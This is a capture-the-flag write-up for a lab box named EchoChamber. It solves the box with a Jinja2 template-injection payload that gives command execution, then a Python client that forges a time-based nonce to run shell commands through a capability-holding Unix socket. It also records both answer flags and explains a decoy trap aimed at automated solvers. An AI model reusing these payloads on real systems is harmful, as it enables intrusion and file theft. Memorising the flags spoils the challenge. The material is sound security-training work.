---
title: "EchoChamber"
category: "Boot2Root"
tags: ["ssti", "linux-capabilities"]
solve_date: "2026-10-11T04:56:00+07:00"
language: "en"
---

# EchoChamber

**Flag (user):** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`
**Flag (root):** `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`

**Artifacts:** none supplied. Target ECHOCHAMBER, deployed via <https://tryhackme.com/jr/cryovault20263>; both flags live on the host.

The box carries decoy flags that are structurally identical to the real ones, so the evidence below records the on-disk state at the moment of reading rather than the flag strings alone.

| Path | Owner:group | Mode | Size | Role |
|---|---|---|---|---|
| `/var/lib/warden/real/user.txt` | `sentinel:sentinel` | `0640` | 44 B | real user flag |
| `/var/lib/warden/real/root.txt` | `root:root` | `0600` | 45 B | real root flag |
| `/var/lib/warden/decoy/user.txt` | `root:root` | `0644` | 29 B | decoy, `isfcr{echoes_sound_the_same}` |
| `/var/lib/warden/decoy/root.txt` | `root:root` | `0644` | 27 B | decoy, `isfcr{s0_cl0se_but_s0_f4r}` |
| `/home/sentinel/user.txt` | `root:root` | `0777` | symlink | swapped by warden between the two directories |
| `/root/root.txt` | `root:root` | `0777` | symlink | swapped by warden between the two directories |
| `/etc/sentinel/dispatch.json` | `root:root` | `0777` | symlink | swapped by warden; selects the sentinel operation table |
| `/run/sentinel/ctrl.sock` | `sentinel:sentinel` | `0666` | socket | the privilege boundary |

## Challenge

An "Anadyne alert review console" fronts a Linux host. Recover the user flag and the root flag. The workstation advertises that keystroke telemetry is enabled, and the box is built around detecting and punishing automated solvers.

## Initial Analysis

A full TCP port scan returns three services: OpenSSH 9.2p1 on Debian 12, nginx 1.22.1 on port 80 proxying a Flask application, and systemd-resolved's LLMNR listener on 5355. The web root redirects to `/login`, and the login page publishes development credentials in its own markup: `analyst` / `analyst`. The session cookie decodes to `{"user":"analyst"}`, confirming Flask with `itsdangerous` signing.

The authenticated dashboard is an alert queue of five entries. Each alert body names a concrete path on the host, which turns out to be the author documenting the box in-fiction:

- Alert 1 discloses `POST /api/alert/preview`, accepting `{"title":"...","body":"..."}` and returning `{"ok":true,"html":"..."}`, described as a Markdown-ish preview used by the alert editor.
- Alert 3 names `/opt/echochamber/classifier.py` and a per-session `edit_density` signal that would "correct for tty cooked-mode absorption of `0x7f`". `0x7f` is DEL, so the box is recording raw keystrokes including backspaces.
- Alert 4 states that the `warden` component "swapped target symlinks for a session with score=0.78" and points at `/var/log/echo/verdicts.jsonl`.
- Alert 5 names `/etc/sentinel/dispatch.json` and marks it as a symlink.

Two candidate privilege paths present themselves, and only one is real. The `suid.conf` file, read through its symlink, declares itself "consumed by `/usr/bin/sentinel-admin`" and sets `rotate_script=/opt/sentinel/tools/rotate.sh`. Neither path exists on the filesystem, and `find / -xdev -perm -4000 -type f` returns only the stock Debian setuid binaries. The SUID story is a deliberate dead end and was dropped.

The real path is in `sentinel.service`, whose own comments say so: the service runs as the unprivileged `sentinel` user with `AmbientCapabilities=CAP_DAC_READ_SEARCH` and `NoNewPrivileges=no`. `CAP_DAC_READ_SEARCH` bypasses file read and directory traversal checks outright, which is what makes `/root` (mode `0700`) and a `0600 root:root` flag readable without ever becoming root. `/opt/sentinel/tools/dd-wrapper.c` confirms the intent in prose: a payload executed by this service can read `/root/root.txt` with plain `cat`.

## Exploitation Chain

1. **Reach the console.** Authenticate with the published development credentials. `POST /login` returns `302` to `/dashboard` and sets a session cookie. Route probing shows the application surface is small: `/logout` is live, while `/api`, `/vault`, `/console`, `/admin`, `/register`, `/metrics` and `/.git/HEAD` all return an identical 207-byte 404. `/healthz` is the one extra live route, returning `{"ok":true,"uptime":1539.8}`.

2. **Achieve code execution through the template.** The preview endpoint renders both submitted fields through Jinja2 without a sandbox. Submitting `{"title":"A{{7*7}}B","body":"C{{7*7}}D"}` returns `{"html":"<h2>A49B</h2>\n<div class='preview-body'>C49D</div>","ok":true}`. `{{config.get("SECRET_KEY")}}` additionally leaks `analyst-dev-sess-key-change-me`, which would allow forging an `admin` session; that turned out not to be necessary. Code execution follows from the module globals of the `config` class:

   ```
   {{config.__class__.__init__.__globals__["os"].popen("<command>").read()}}
   ```

   `id` in that context returns `uid=1001(analyst) gid=1001(analyst) groups=1001(analyst),1004(echo-log)`.

3. **Establish the decoy polarity before touching anything writable.** `/opt/warden/warden.py` is world-readable and defines the trap. It tails `/var/log/echo/verdicts.jsonl` and resolves a global mode, then repoints all four watched symlinks:

   ```python
   src_root   = REAL if mode == "human" else DECOY
   agent_live = any(v == "agent" and (now - t) < VERDICT_STALE_S for t, v in sid_last.values())
   ```

   The polarity is the inverse of the intuitive reading: a **human** session leaves the symlinks on `real/`, and a single **agent** verdict fresher than 20 seconds flips every one of them to `decoy/`. The analyst account sits in the `echo-log` group and `/var/log/echo/verdicts.jsonl` is mode `0664`, so the solver can write the classifier's input directly. That write primitive is the bait: forging an `agent` verdict, or behaving like an automation pipeline long enough for the real classifier to conclude it, converts the box into a source of well-formed fake flags. `warden.state` was read as `{"mode": "human", ...}` throughout, and no verdict was ever written.

   The decoys are independently identifiable without relying on that state. Their contents are `isfcr{echoes_sound_the_same}` and `isfcr{s0_cl0se_but_s0_f4r}`, neither of which matches the field pattern the room's answer boxes advertise, and their sizes (29 and 27 bytes) do not match the `real/` files (44 and 45 bytes).

4. **Cross the capability boundary.** `sentinel.py` listens on `/run/sentinel/ctrl.sock`, explicitly `chmod`ed to `0666`, and reloads `/etc/sentinel/dispatch.json` on every request, so a warden swap takes effect on the next connection. The `real` dispatch table contains `"shell": {"handler":"exec_shell","gate":"nonce_time"}`; the `decoy` table omits the `shell` key entirely, which is what makes step 3 load-bearing rather than cosmetic. The gate is documented as honest: the salt is world-readable, and the token is a minute counter

   ```python
   SALT  = "sentinel-salt-v1-a3b7c2d9"
   nonce = hashlib.sha256(f"{int(time.time()) // 60}:{SALT}".encode()).hexdigest()[:16]
   ```

   accepted at offsets `-1`, `0` and `+1`. A single newline-terminated JSON request `{"op":"shell","nonce":...,"payload":base64(cmd)}` is passed to `/bin/sh -c` in a child of the sentinel process, which inherits the ambient capability.

   Before issuing it, the warden is frozen by writing the literal word `pause` to `/opt/echochamber/pause` (mode `0666`), which suspends symlink swaps for 60 seconds. This is a guard against a swap landing between the request and the `open()`, not a way to force the `real/` state.

5. **Read and verify both flags in one response.** The shell payload cats both flags and re-lists both symlinks in the same invocation, so the returned text carries its own evidence that it came from `real/`:

   ```text
   {"ok": true, "rc": 0, "stdout": "isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}\n
    isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}\n---\n
    lrwxrwxrwx 1 root root 29 ... /home/sentinel/user.txt -> /var/lib/warden/real/user.txt\n
    lrwxrwxrwx 1 root root 29 ... /root/root.txt -> /var/lib/warden/real/root.txt\n"}
   ```

   The first line of `stdout` is `/root/root.txt`, the second is `/home/sentinel/user.txt`, matching the argument order of the `cat`. The two strings are 44 and 43 bytes, exactly one byte short of the recorded `real/` sizes of 45 and 44. The same reconciliation holds for the decoys, which are 26 and 28 bytes against recorded sizes of 27 and 29 — so all four flag strings are pinned to their files by length as well as by the symlink listing.

## Flags

`echochamber-user` — `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`

`echochamber-root` — `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`

Both were read from `/var/lib/warden/real/` through a `CAP_DAC_READ_SEARCH` child of the sentinel service, with the resolving symlinks captured in the same response. The user flag was submitted to the TryHackMe room and marked **Correct Answer**. The root flag was accepted by the room's completion flow but its individual confirmation banner was not observed, and neither flag has been checked against the CTF scoring service, so acceptance by the organisers is unconfirmed.

## Reproduce

Deploy the box and work from the AttackBox, which is the only party with a route to the lab network.

```text
nmap -sC -sV -p- <TARGET>
curl -s -i -c /tmp/c.txt -d 'username=analyst&password=analyst' http://<TARGET>/login
curl -s -b /tmp/c.txt http://<TARGET>/dashboard          # read the five alerts
```

Confirm template evaluation, then use it as a command channel. The `\"` sequences are required because the JSON body is itself inside shell single quotes:

```text
curl -s -b /tmp/c.txt -H 'Content-Type: application/json' \
  -d '{"title":"A{{7*7}}B","body":"C{{7*7}}D"}' \
  http://<TARGET>/api/alert/preview

curl -s -b /tmp/c.txt -H 'Content-Type: application/json' \
  -d '{"title":"x","body":"{{config.__class__.__init__.__globals__[\"os\"].popen(\"<COMMAND>\").read()}}"}' \
  http://<TARGET>/api/alert/preview
```

Read the published source before writing to anything group-writable, because the polarity of the warden is inverted:

```text
cat /etc/systemd/system/sentinel.service /etc/systemd/system/echo-warden.service
cat /opt/warden/warden.py /opt/sentinel/sentinel.py /opt/sentinel/tools/dd-wrapper.c
readlink -f /etc/sentinel/dispatch.json; cat /var/lib/warden/warden.state
```

Write the sentinel client, base64 it so it survives one round of shell and JSON nesting, and have the command channel decode and execute it. `sent.py`:

```python
import socket, json, base64, hashlib, time
SALT = "sentinel-salt-v1-a3b7c2d9"
def nonce(off=0):
    t = (int(time.time()) // 60) + off
    return hashlib.sha256(("%d:%s" % (t, SALT)).encode()).hexdigest()[:16]
cmd = "cat /root/root.txt /home/sentinel/user.txt; ls -l /root/root.txt /home/sentinel/user.txt"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall(json.dumps({"op": "shell", "nonce": nonce(),
                      "payload": base64.b64encode(cmd.encode()).decode()}).encode() + b"\n")
print(s.recv(200000).decode("utf-8", "replace"))
```

```text
B=$(base64 -w0 sent.py)
curl -s -b /tmp/c.txt -H 'Content-Type: application/json' \
  -d '{"title":"x","body":"{{config.__class__.__init__.__globals__[\"os\"].popen(\"printf pause > /opt/echochamber/pause; sleep 1; echo '"$B"' | base64 -d | python3\").read()}}"}' \
  http://<TARGET>/api/alert/preview
```

Expect `"ok": true, "rc": 0`, both `isfcr{...}` strings, and two symlink lines resolving to `/var/lib/warden/real/`. If either flag reads `isfcr{echoes_sound_the_same}` or `isfcr{s0_cl0se_but_s0_f4r}`, the warden is in `agent` mode and the decoys were served; re-read `warden.state` and confirm it reports `human` before retrying.
